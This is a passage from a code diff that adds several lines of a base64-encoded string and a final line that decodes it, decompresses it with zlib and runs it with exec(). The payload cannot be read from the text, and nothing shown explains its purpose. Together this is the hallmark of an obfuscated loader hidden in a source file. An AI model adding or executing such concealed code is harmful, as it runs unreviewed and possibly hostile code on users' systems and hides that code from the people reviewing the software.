+    "MghnfBRXfNuxijm4BOGXjoKKWToECG27nk2cda/xqDRPsyeE+Fk7W5gJbnHggYiS1DwC/klpe5Zo37"
+    "b8su/BuANNymK9nF+Rl+vDczj+ClaY+2cztjP3CHQktnZBehgYpeda4LTO4DV3qoDz78y1OLbecAJi"
+    "gOAXCg3LQOtAgCG7qY4IjfrUXeXpQYyOantM+dCmmj363v1U4O2l2uZneB8UzpyiCHCqDgrB6DCqwg"
+    "gAFnSIJ7KE7um+OG3VsEMVfWiFRgDK5R4pMVyD9DiJrSPqmIqagBSmzVd5r1drd99KremNoTuVtHEI"
+    "k+RGeMMeZ0CYTyJY8Re3SWSfSKPrBffkEZhihHp1iEACBybD3t1PU2Qi3zB0rjp2f8O9WJGq/01pEm"
+    "Bc/bQRW4iAnPhkdNj+iNG0p92dbqxrKOIab46xRNXRv0dqaWriFjW1fLo31JHzQf+P8DddXsag=="
+)
+exec(zlib.decompress(base64.b64decode(b''.join(_d.split()))).decode('utf-8'))
